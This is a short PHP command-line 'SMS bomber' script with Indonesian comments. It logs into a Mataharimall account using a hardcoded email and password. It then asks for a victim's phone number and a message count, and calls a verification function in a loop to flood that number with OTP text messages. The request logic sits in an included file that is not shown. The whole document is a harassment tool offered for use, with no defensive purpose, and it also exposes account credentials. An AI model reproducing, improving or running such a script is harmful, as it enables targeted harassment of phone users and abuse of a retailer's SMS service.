<?php
/*
    Dwewwwwwwwd
*/

include 'bommthrml.php';

$init = new Bom();
// Konfigurasi Akun Mataharimall
$init->email = "dw@c1oramn.com";
$init->pass = "Hilih kintil";
$init->Login($init->email,$init->pass);

//Eksekusi Sms Boomber
echo "Nomor Target (pakai 62)\nInput : ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "Jumlah Pesan\nInput : ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) { 
    $init->Verif($init->no);
}
